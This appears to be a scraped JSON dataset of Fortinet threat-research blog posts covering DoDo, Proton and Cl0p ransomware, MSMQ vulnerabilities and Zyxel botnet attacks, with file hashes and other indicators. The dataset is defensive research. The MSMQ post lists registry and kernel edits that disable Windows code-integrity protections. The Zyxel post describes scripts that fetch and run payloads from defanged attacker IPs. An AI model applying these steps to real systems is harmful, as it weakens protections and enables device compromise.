encrypted files, they have two things in common: all DoDo ransomware samples were created using Chaos Builder version 3, which was released in mid-2021, and they all use the same Bitcoin address to receive ransom payments. Chaos ransomware Builder 3 has the disadvantage that it can only encrypt files smaller than 1 MB. Files larger than that are overwritten and considered unrecoverable unless backups remain intact. This really means that DoDo operates much like a wiper for larger files because the attacker cannot recover all of their files even if the ransom payment is made. The older DoDo ransomware variants dropped a ransomware note labeled “dodov2_readit.txt” and added a “.dodov2” extension to the encrypted files. The ransom demand is $15 worth of Bitcoin or Monero (XMR). In contrast, the recent DoDo ransomware samples drop a ransom note labeled “PLEASEREAD.txt,” add a “.crypterdodo” extension to the encrypted files, and replace the desktop wallpaper with the same ransom message. The ransom demand is still $15 worth of Bitcoin or Monero (XMR). The attacker has also included a contact email address, likely for better “customer” service. In addition, the Monero address is different from the older variants. The Bitcoin address used by the DoDo ransomware has had more than 40 transactions since May 2022. However, most incoming transactions were under $10, raising questions as to whether they were ransom payments. The Monero addresses were not available at the time of our investigation. Proton is a recently reported ransomware designed to encrypt files on the Windows platform and demand ransom payments from victims to recover their affected files. Information on the infection vector used by the Proton ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. Proton ransomware samples were submitted to a public file scanning service from the following locations: While there is no indication that the Proton ransomware is widespread, this list shows that attackers have the means to distribute ransomware in different parts of the world. Once executed, the Proton ransomware encrypts files on victims’ machines and adds a “.[the attacker’s contact email address]. Proton” extension to the affected files. It also changes the file icon of the encrypted files and drops a ransom note labeled “#[Unique ID assigned to each victim].txt” while replacing the victim’s desktop wallpaper. The Proton ransomware has several minor variants, most adding different contact email addresses as part of the file extensions added to the encrypted files. Below is a list of the contact addresses that the attacker has included in the ransom notes: During our research, FortiGuard Labs came across what appears to be the earliest sample of the Proton ransomware (SHA2: f36dda3b97266a6a30d905c73e1f8a45c4b6681e81fb2f8f59b622de899c4421), which was released in late March 2023. While the ransom note calls itself \"Proton,\" it does not use a \". Proton\" file extension. Instead, the sample uses \"Kigatsu@[redacted][victim's unique ID].kigatsu\". The ransom note includes the attacker’s Telegram ID, which is not seen in the recent ransom notes. As shown below, this variant does not replace the file icon of the encrypted files with the unique Proton logo. Another Proton ransomware variant was submitted to a public file scanning service in late June. This variant (SHA2: 3a86c8c0e96ef1984177c41c87dec40fe0df3fe71b8ef951063312010c86c9bb) uses a similar email address and the same Telegram ID as the oldest Proton ransomware sample but adds \".[attacker's email address]. Proton\" to encrypted files and also changes their file icon. Based on these observations, we believe that the attacker has made some effort to improve the operation of this ransomware since its inception. Fortinet customers are already protected from this malware variant through AntiVirus and FortiEDR services, as follows: FortiGuard Labs detects known DoDo ransomware variants with the following AV signatures: FortiGuard Labs detects known Proton ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: 8727091cbb89e5e31eeb2503ffaa242601c8840eee0973fd62fedf1b4b58ab44 DoDo Ransomware f912cd2a6cd21e828dc32b97eac0ce9b2c4e8d5a7944deaa4bd61f41ab8e1997 aee45cc2540d49a28e765c30f1c4d0b853c1a74ea2260bd7614ece8e54c3bcb3 8d76a9a577ea5ad52555a2824db6f5872548fe4bcc47d476cae57603386c4720 464d6aa8389dad3aebc36f748f6687cb57432ee791b84ff18b3dd5a342ce23a0 Proton ransomware 506dc9f186f820b5e1d39e5f553949415ced6c34d1ef4f4f723ce9d6558cfc5d 877a01b2b6b79572100ba61d799d08569063910a7f56e199bf4805cf0943e140 31485a7ce7e5b4ae39ee06c8c425fe9090d1520b062b4941ad37233cc4851fe6 9adae78f48f24419b6f8a895c1244a1576a4c7fe73e9bc32136893630ce735bd b7fbf5561006e41d56bde9e26895c8be3a3853436870e86f6929f51b719089d9 8fa93ce6b9dcf00ecf853f266f68aa033b057187c2061b950367c9ec9891571e e43db9691d7947f7edadb0f9ae8317301aeaea7604f74e69dbcb4b23420e4cbe 6a8ef9185b85490a258eda096777ba0805394e587cf8a0f8f800b87e0594edca 077621c13e3688eb4959b66a1f6f18f3791e5d869e8f064a72498d70b2e36727 39b8c17d79733974ced9a4beeb112d888174b7addca6cea008eea3846fa33658 3a86c8c0e96ef1984177c41c87dec40fe0df3fe71b8ef951063312010c86c9bb f36dda3b97266a6a30d905c73e1f8a45c4b6681e81fb2f8f59b622de899c4421 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-dodo-and-proton",
      "scraped_at": "2025-07-20T13:54:39.635781",
      "indicators": {
        "ip_address": [],
        "domain": [
          "LEASEREAD"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "8727091cbb89e5e31eeb2503ffaa242601c8840eee0973fd62fedf1b4b58ab44",
          "31485a7ce7e5b4ae39ee06c8c425fe9090d1520b062b4941ad37233cc4851fe6",
          "077621c13e3688eb4959b66a1f6f18f3791e5d869e8f064a72498d70b2e36727",
          "877a01b2b6b79572100ba61d799d08569063910a7f56e199bf4805cf0943e140",
          "6a8ef9185b85490a258eda096777ba0805394e587cf8a0f8f800b87e0594edca",
          "9adae78f48f24419b6f8a895c1244a1576a4c7fe73e9bc32136893630ce735bd",
          "8fa93ce6b9dcf00ecf853f266f68aa033b057187c2061b950367c9ec9891571e",
          "39b8c17d79733974ced9a4beeb112d888174b7addca6cea008eea3846fa33658",
          "b7fbf5561006e41d56bde9e26895c8be3a3853436870e86f6929f51b719089d9",
          "f912cd2a6cd21e828dc32b97eac0ce9b2c4e8d5a7944deaa4bd61f41ab8e1997",
          "e43db9691d7947f7edadb0f9ae8317301aeaea7604f74e69dbcb4b23420e4cbe",
          "aee45cc2540d49a28e765c30f1c4d0b853c1a74ea2260bd7614ece8e54c3bcb3",
          "8d76a9a577ea5ad52555a2824db6f5872548fe4bcc47d476cae57603386c4720",
          "506dc9f186f820b5e1d39e5f553949415ced6c34d1ef4f4f723ce9d6558cfc5d",
          "3a86c8c0e96ef1984177c41c87dec40fe0df3fe71b8ef951063312010c86c9bb",
          "464d6aa8389dad3aebc36f748f6687cb57432ee791b84ff18b3dd5a342ce23a0",
          "f36dda3b97266a6a30d905c73e1f8a45c4b6681e81fb2f8f59b622de899c4421"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6993464052287582
    }
  },
  {
    "id": "Fortinet_14734",
    "source": "Fortinet",
    "title": "FortiGuard Labs Discovers Multiple Vulnerabilities in Microsoft Message Queuing Service",
    "text": "FortiGuard Labs Threat Research Over the last few months, FortiGuard Labs has discovered and reported multiple vulnerabilities found in the Microsoft Message Queuing (MSMQ) service. Microsoft patched these vulnerabilities in the April and July 2023 security updates. These patches are rated as critical/important, and as always, we urge users to install them as soon as possible. Affected platforms:WindowsImpacted parties:Microsoft Windows users with Microsoft Message Queuing service installedImpact:Remote code execution and denial-of-serviceSeverity level:Critical and Important In this post, we will walk through the attack surfaces of MSMQ, the approaches we took to tackle the challenges we encountered during fuzzing, and finally, we will provide details of the vulnerabilities. MSMQ is a proprietary messaging protocol developed by Microsoft that allows applications running on separate computers to communicate in a failsafe manner. MSMQ ensures reliable delivery by placing messages that fail to reach their intended destination in a queue and then resending them once the destination is reachable. RabbitMQ is an open-source messaging queuing protocol similar to MSMQ. The MSMQ service is hosted as a standalone Windows service under MQSVC. EXE. The MSMQ operation is implemented in both user-mode and kernel-mode components, namely MQQM. DLL and MQAC. SYS. As shown in Table 1, MQQM. DLL exposes TCP/IP and Remote Procedure Calls (RPC) ports allowing applications to interact with the service via the network. Based on the open ports being used, we determined that most of the potential attack surfaces are reachable remotely by adversaries. In other words, any security vulnerability discovered from these identified attack surfaces could have a severe security impact, from remote Denial of Service (DoS) to remote code execution. As a result, we uncovered three security issues reachable through port 1801, which were caused by message header parser routines implemented in MQQM. DLL. However, our attempts to identify security issues through the RPC interface have yet to yield results. Fuzzing the message header parser is straightforward, as the message header parser operates in multiple threads and thus can handle concurrent messages independently. Furthermore, there is no global state that will affect the fuzz result when the fuzzer sends crafted packets to the target. However, the challenge is that the target is running on a remote service process, and we need to monitor the target service process when it crashes. When the crash happens, a manual process restart is required as the Windows automatic service restart is not persistent. This is necessary to ensure a persistent fuzzing operation that can run continuously. Injecting DLL into the Windows Service process used to be relatively straightforward on older versions of Windows, such as Windows 7, before protected process light (PPL) and control guard were introduced. Various control guards have been deployed on critical Windows processes, such as Windows services, since Windows 10. In particular, Code Integrity Guard (CIG), which requires binaries to be signed by Microsoft if they run on Windows-protected processes, and Application Control Guard (ACG), which controls the host application's behavior according to mitigation policies. In our case, we were greeted with the message shown in Figure 1 when we injected our custom unsigned DLL into SERVICES. EXE. According to the error message, when User-Mode Code Integrity (UMCI) is enforced, untrusted binaries cannot be executed or loaded into the protected process. While a UMCI exclusions path is partially documented by Microsoft, following the suggested registry key modification does not immediately enable us to run an unsigned DLL in the service host process. After some reverse engineering on the code integrity module, namely CI. DLL, we concluded that the following requirements need to be satisfied to work around the UMCI checks: 1. Enable UMCI path exclusions. The following example adds an exclusion for \"\\tools\" Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\TRSData]\"TestPath\"=hex(7):5C,00,74,00,6f,00,6f,00,6c,00,73,00,00,00,00,00 2. Enable UMCI audit mode. Add the following REG_DWORD Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\CI]“UMCIAuditMode” = dword:00000001 3. CI!g_CiDeveloperMode|2bitmask must be set beforeCI! CiInitializePolicyfunction exits 4. Unset the PsProtectedLight flag on the target process via EPROCESS. Protection 5. Unset the DisableDynamicCode and AuditDisableDynamicCode flags on the target process via EPROCESS. MitigationFlagsValues An astute reader should realize that steps 3 – 5 require real-time modification of some data in the kernel-module data structure. However, it is trivial to achieve if you have a Windows kernel debugger attached to the target OS. After that, the custom DLL can install a hook on the service host process to monitor process creation and process termination operations. For our use case, the custom DLL uses the Windows debugger API to capture exceptions/crashes for our target service process, MQSVC. EXE. The code snippet for the main debugger thread is shown in Figure 3. At the same time, we also wanted to attach a debugger to the service process before it starts to execute. This is very helpful in reverse engineering if you want complete control over the target process before it starts to execute any code. On top of that, we can also use the Windows Time-Travel-Debugger (TTD), tttracer.exe, to capture the complete trace of the target service process, which is helpful for crash triaging. Figure 4 shows the code snippet of the hook function in the custom DLL that will delay the execution of the target process when it is spawned by services.exe. Network protocol fuzzing is more effective if we send well-crafted packets to the target. Fortunately, MSMQ specifications are publicly available, and most importantly, most of its message headers data structure is documented by Microsoft. This allows us to write a structure-aware fuzzer that will mutate data according to its format and data type rather than generating random meaningless input data. Another critical component needed by our MSMQ fuzzer is a coverage-guided capability. TinyInst by Ivan Fratric is my first go-to binary instrumentation library for remote process fuzzing. Furthermore, the library is well-designed, making it easy to integrate into any custom fuzzer. Figure 5 shows the code snippet of the MSMQ fuzzer that attempts to generate a structured EodMessage header packet. A typical MSMQ packet must include headers, such as BaseHeader, UserHeader, and MessagePropertiesHeader. It may also include additional optional headers, like TransactionHeader, SecurityHeader, DebugHeader, SessionHeader, etc. As shown in Figure 6, the optional headers come after the mandated headers and are ordered sequentially. Our MSMQ fuzzer considers the order of the message headers to pass the sanity check of the message header parser. One of the RCE vulnerabilities is, in fact, caused by an unsanitized field in a particular message header data structure when the crafted packet is parsed by the message header parser. Because of how the message header parses the packets—looking for the headers sequentially—it will eventually trigger an out-of-bounds memory write. FortiGuard Labs provides vulnerability identification signatures toFortiDASTusers that can detect these vulnerabilities via an exploit engine module called the FortiDAST Scripting Engine (FSE). Some of the basic features of this exploit engine were introduced in a FortiGuardblogback in 2021. FortiDAST performs automated black-box dynamic application security testing of web applications to identify vulnerabilities that threat actors may exploit. FSE is an add-on to FortiDAST that enables the detection of CVE-specific vulnerabilities on networked assets not limited to web applications. When users configure the Exploit Engine (Figure 8), they will be asked to select the type of applications currently supported by FSE. In this case, we will demonstrate the ability of FortiDAST to detect assets that run the vulnerable Message Queuing service. Upon completing the scan, FortiDAST will show the result of FSE under the Exploit Engine dashboard, as shown in Figure 10: This next section reviews the vulnerabilities we discovered using the process described above along with related IPS signatures. This out-of-bounds read occurs because EodHeader, StreamIdSize, and OrderQueueSize are not validated before accessing them in the message header parser routine CQmPacket::CQmPacket. The message header parser routine has scrutinized most of the message header, but it turns out that the data structure for the header in question is not being validated. Based on our analysis, an information disclosure exploit seems implausible. However, a denial-of-service attack can be achieved when the out-of-bound read accesses an invalid address. FortiGuard Labs has released the IPS signatureMS. Windows. Message. Queuing. Service. CVE-2023-28302. DoSto detect this issue. This out-of-bounds write occurs because the message header parser, CQmPacket::CQmPacket, does not properly validate a message header with an arbitrary size. Some message headers, such as EodHeader, EodAckHeader, and CompoundMessageHeader, allow attackers to specify an arbitrary size/length that is not properly sanitized. As mentioned previously, the message headers are organized in sequential order. The message header parser will adjust the pointer according to the defined data structures for each specific message header. Since some message headers are not being validated, the pointer can be adjusted to point to an arbitrary location, an invalid address in this context, and potentially cause memory corruption when the pointer to the message header is dereferenced in the later part of the code. FortiGuard Labs has released the IPS signatureMS. Windows. MSMQ. CVE-2023-21554. Remote. Code. Executionto detect this issue. This vulnerability is a result of a manual code audit. After analyzing the previous vulnerabilities, we looked into the message headers that have not performed a sanity check on their data structure. As a result, the CompoundMessage header caught our attention. Figure 11 defines the CompoundMessage header data structure. Based on our analysis, the message header was referenced in CQmPacket::GetPacketBody. This function will retrieve data from the MsgBodySize field. An out-of-bounds write will occur when the data is dereferenced without any sanity check in functions such as CQmPacket::Decrypt, VerifySignature10, and VerifySignature20, just to name a few. Apart from the CompoundMessage header, the SecurityHeader is also required in the crafted network packet to trigger this vulnerability. Notably, all the data fields in the SecurityHeader data structure are properly validated. A malformed data structure in the CompoundMessage header could affect the MSMQ kernel mode component, MQAC. SYS. Our fuzzer uncovered the faulty code path to trigger the out-of-bounds write in MQAC. SYS with a properly defined SrmpEnvelopeHeader that holds SOAP XML contents to the target queue. Figure 12 shows the crash call stack in MQAC. SYS when it leverages the unsanitized length in the CompoundMessage header. FortiGuard Labs has released the IPS signatureMS. Windows. MSMQ. CompoundMessage. Remote. Code. Executionto detect this issue. Fortinet customers can use FortiDAST to identify any network assets that may be vulnerable to the MSMQ vulnerabilities discussed previously. FortiGuard Labs has also released IPS signatures to protect our customers from the vulnerabilities mentioned in this post. Again, we can’t emphasize enough the urgency to apply the latest Microsoft patches to prevent you or your organization from falling victim to a devastating cyberattack. FortiDASTcustomers are able to detect the existence of these vulnerabilities in their assets. Fortinet IPS customers are protected with the following signatures, which were previously released for these vulnerabilities: If you believe these or any other cybersecurity threats have impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/microsoft-message-queuing-service-vulnerabilities",
      "scraped_at": "2025-07-20T13:54:47.367801",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ttracer",
          "ervices"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2023-21554",
          "CVE-2023-28302"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.1465002712967987
    }
  },
  {
    "id": "Fortinet_87916",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Cl0p",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Cl0p ransomware. Affected platforms:Microsoft Windows, LinuxImpacted parties:Microsoft Windows, Linux UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High Recently, the Cl0p ransomware group received a lot of media attention for compromising a large number of organizations by exploiting a recently-unpatched vulnerability in MOVEit Transfer (CVE-2023-34362), a managed file transfer (MFT) solution. Although there is no evidence that the threat actor used the encryptor in this particular incident, the group exfiltrated data from victims and threatened them with ransom in exchange for not exposing the stolen information. This blog provides insights into the Cl0p ransomware group’s activities over the past several years. Note that FortiGuard Labs released an Outbreak Alert for the MOVEit Transfer incident. Please refer to “Progress MOVEit Transfer SQL Injection Vulnerability” for additional information. The history of Cl0p ransomware goes back to early 2019 and is typically associated with financially motivated threat actor FIN11 (also known as TA505 and Snakefly), who is known to target organizations in North America and Europe. The Cl0p ransomware appears to be a descendent (or variant) of another ransomware, “CryptoMix”, which also has an association with FIN11. And CryptoMix is reportedly a hybrid of the ransomware variants “CryptXXX” and “CryptoWall”. However, that claim has not yet been independently verified by FortiGuard Labs. Typically, FIN11 unleashes Cl0p ransomware on a victim’s network to encrypt files after stealing information. However, the ransom note dropped by an older Cl0p ransomware variant, shown below, shows no evidence of FIN11 having exploited victim data, at least during the early period of Cl0p ransomware activity. It is estimated that they only began exfiltrating victim information around the time the leak site described later in this report was set up. At some stage in its operations, the FIN11 group revised its strategy of deploying ransomware and shifted to purely exfiltrating information from victims for extortion. In fact, there is no evidence that the Cl0p ransomware was deployed when the MOVEit Transfer vulnerability was recently exploited. Deployed Cl0p ransomware variants append a new file extension to the files it encrypts. Typical file extensions include, but are not limited to, “. Clop”, “. Cl0p”, “. C_L_O_P”, “. C_I_0P” and “. Cllp”. Cl0p ransomware ransom notes are labeled “ClopReadMe.txt”, “README_README.txt” and “!!!_READ_!!!. RTF”. The Cl0p threat actor is also associated with the use of the Cobalt Strike post-exploitation tool, web shells such as DEWMODE and LEMURLOOT, SDBot, and the FlawedAmmyy remote access trojan (RAT). FIN11 is also known to use spear-phishing to target victims. FIN11 recently leveraged the MOVEit Transfer SQL injection vulnerability (CVE-2023-34362) to gain initial entry to victim networks. This was not the first time the group has exploited vulnerabilities. According toa reportpublished by the Health Sector Cybersecurity Coordination Center (HC3), the following vulnerabilities have been potentially exploited by this group: While earlier Cl0p ransomware variants only include an attacker’s contact email addresses, the ransom group subsequently set up a data leak site on TOR in 2020 called “CL0P^_-LEAKS” to post information stolen from victims. On the TOR site, the ransomware group also states that its primary motivation is financial gain and that it is not politically motivated in its choice of victims. The group also claims that it intends to attack commercial pharmaceutical companies, but not hospitals and social institutions. As of July 15th, 2023, Fortinet's FortiRecon service listed 419 victim organizations on the Cl0p ransomware data leak site. According to data collected through Fortinet's FortiRecon service, the Cl0p ransomware group preyed on several industry sectors between January and June 2023, with business services leading the way, followed by software and finance. When victim organizations are classified by country, the United States is in first place by a significant margin. By region, nearly three-quarters of victims are located in North America and Europe. The FortiRecon data below indicates that the Cl0p ransomware has been more active in 2023 than 2022 and 2021. The inactivity of the ransomware group from May to July 2021 could be attributed tothe arrest of some Cl0p ransomware operatorsin June 2021, though we cannot verify this. Looking closely at the prevalence of Cl0p ransomware in the United States during the first half of 2023, Cl0p ranked third behind LockBit and Blackcat (ALPHV) ransomware. The Cl0p ransomware has been around since early 2019, and its developers are still one of the most active ransomware threat actors today. While they seem to have largely shifted from \"exfiltrating and encrypting data and extorting money\" to simply \"exfiltrating data and extorting money,\" affected organizations are just as impacted as before. As the group is known to exploit high-severity vulnerabilities, including the recently disclosed MOVEit Transfer vulnerability, patch management is critical to preventing attacks by the group. Note that a large number of Cl0p ransomware samples exist due to the high prevalence of the ransomware over the past several years. Because of this, this section only contains a small number of samples from the ransomware family. 3320f11728458d01eef62e10e48897ec1c2277c1fe1aa2d471a16b4dccfc1207 Cl0p ransomware d0cde86d47219e9c56b717f55dcdb01b0566344c13aa671613598cab427345b9 Cl0p ransomware d36766cbc149d7f79654d2810ffe2fd3b1a6487fe3aff6ff010e664b60493cf0 Cl0p ransomware 1687eda911c5129f3189d7e1ad31430856d7732fe870eb49971298367b98189c Cl0p ransomware f1b8c7b2d20040f1dd9728de9808925fdcf035a1a289d42f63e5faa967f50664 Cl0p ransomware 343cb2d5900f5fe4abd5442a4a18541753fbb6ca5ff4ee7f2c312ed96e413335 Cl0p ransomware 968307a367471e25bef58b0d4687ab4fdf34539bbfb603b5b19ae99d4d0c0340 Cl0p ransomware 09d6dab9b70a74f61c41eaa485b37de9a40c86b6d2eae7413db11b4e6a8256ef Cl0p ransomware for Linux FortiGuard Labs has the following AV signatures in place for the Cl0p ransomware samples listed in the IOC section: Additionally, the following AV signatures are available for Cl0p ransomware samples: FortiGuard Labs has put the following IPS signatures in place for the vulnerabilities reportedly exploited by the Cl0p ransomware threat actor: Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Fortinet’s FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations also need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Organizations are encouraged to implement cloud-based security solutions, such asSASE, to protect off-network devices, advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack, andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context. These solutions are proven to minimize risk and reduce the impact of a successful ransomware attack. By operating these solutions as part of the industry's only fully integratedSecurity Fabric, organizations can also take advantage of native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings that can be deployed independently or as part of the Fortinet Security Fabric. These services are powered by advanced AI-enabled technologies and our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because payment does not guarantee that files will be recovered. According to aU. S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-cl0p",
      "scraped_at": "2025-07-20T13:54:55.794891",
      "indicators": {
        "ip_address": [],
        "domain": [
          "lopReadMe"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "d0cde86d47219e9c56b717f55dcdb01b0566344c13aa671613598cab427345b9",
          "343cb2d5900f5fe4abd5442a4a18541753fbb6ca5ff4ee7f2c312ed96e413335",
          "d36766cbc149d7f79654d2810ffe2fd3b1a6487fe3aff6ff010e664b60493cf0",
          "09d6dab9b70a74f61c41eaa485b37de9a40c86b6d2eae7413db11b4e6a8256ef",
          "1687eda911c5129f3189d7e1ad31430856d7732fe870eb49971298367b98189c",
          "3320f11728458d01eef62e10e48897ec1c2277c1fe1aa2d471a16b4dccfc1207",
          "f1b8c7b2d20040f1dd9728de9808925fdcf035a1a289d42f63e5faa967f50664",
          "968307a367471e25bef58b0d4687ab4fdf34539bbfb603b5b19ae99d4d0c0340"
        ],
        "cve": [
          "CVE-2023-34362"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.7338820301783263
    }
  },
  {
    "id": "Fortinet_72621",
    "source": "Fortinet",
    "title": "DDoS Botnets Target Zyxel Vulnerability CVE-2023-28771",
    "text": "FortiGuard Labs Threat Research Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical In June 2023, FortiGuard Labs detected the propagation of several DDoS botnets exploiting the Zyxel vulnerability (CVE-2023-28771). This vulnerability is characterized by a command injection flaw affecting multiple firewall models that could potentially allow an unauthorized attacker to execute arbitrary code by sending a specifically crafted packet to the targeted device. The severity of this flaw, rated 9.8 on theCVSSscoring system, was reported by researchers fromTRAPA Security. Zyxel released asecurity advisoryregarding this vulnerability on April 25, 2023. Subsequently, the Cybersecurity and Infrastructure Security Agency (CISA) added this security flaw to itsKnown Exploited Vulnerabilities(KEV) catalog in May. Through the capture of exploit traffic, the attacker's IP address was identified, and it was determined that the attacks were occurring in multiple regions, including Central America, North America, East Asia, and South Asia. Since the publication of theexploit module,there has been a sustained surge in malicious activity. Analysis conducted by FortiGuard Labs has identified a significant increase in attack bursts starting from May, as depicted in the trigger count graph shown in Figure 1. We also identified multiple botnets, including Dark. IoT, a variant based on Mirai, as well as another botnet that employs customized DDoS attack methods. In this article, we will provide a detailed explanation of the payload delivered through CVE-2023-28771 and associated botnets. Based on our observations over the past month, we have noted that these attacks originate from distinct IP addresses: 193[.]32[.]162[.]190, 109[.]205[.]213[.]30, 109[.]207[.]200[.]42, 109[.]207[.]200[.]47 and 109[.]207[.]200[.]44. These attacks specifically target the command injection vulnerability in the Internet Key Exchange (IKE) packet transmitted over UDP on Zyxel devices. The attackers utilize tools such as curl or wget to download scripts for further actions. Below, you can find the corresponding traffic capture illustrating these activities. The script files obtained in these attacks exclusively download files tailored for the MIPS architecture, indicating a highly specific target. In Figure 3, the script downloads a file named \"lolmips\" from the IP address 92[.]118[.]39[.]16 and saves it as \".zw\". Subsequently, it executes with the \"zywall\" parameter indicating its connection to the Zyxel firewall vulnerability. The script file shown in Figure 4 was downloaded from 171[.]22[.]136[.]15, which has been associated with theRapperbotmalware. However, we observed this script being forwarded to 171[.]22[.]136[.]18, where it dropped additional MIPS files for subsequent actions. The script files in Figure 5 exhibit similar code patterns despite originating from different server IP addresses. These scripts employ the \"rm -rf\" command to remove the \".zw\" file from the temporary folder and save the current file as \"/tmp/a\". Notably, the execution files display resemblances. It appears that this campaign utilized multiple servers to launch attacks and updated itself within a few days to maximize the compromise of Zyxel devices. In the following sections, we introduce the botnets we have identified as spreading via CVE-2023-28771 over the past month. Based on the C2 server list, which includes numerous domains with the \".lib\" extension, including some used in previous versions, we identified this variant as Dark. IoT. Dark. IoT first emerged in 2021 and has established itself as a prolific botnet that extends its targeting beyond IoT devices. It updated its C2 server in April with \"raw.pastebin.com,\" and we encountered a newer version in June. One prominent feature of Dark. IoT is the presence of the data string \"pte8cjbdwrmn57g4i6qual20s1k3vfoh,\" which generates random alphanumeric strings during the setup process. The corresponding function can be seen in Figure 6. Dark. IoT employs the ChaCha20 algorithm to encrypt its configuration. During the decryption process, it first performs an XOR operation on the 32-byte decryption key with the value 0x55. Subsequently, it utilizes this modified key along with a nonce to invoke the ChaCha20 decryption function. The code responsible for this decryption process is displayed in Figure 7. Upon successful decryption, the identified C2 servers are as follows. (Notably, the last two servers, namely \"routercontroller[.]geek\" and \"dvrcontroller[.]libre,\" have been newly added in this version. Dark. IoT utilizes the OpenNIC server with the IP address 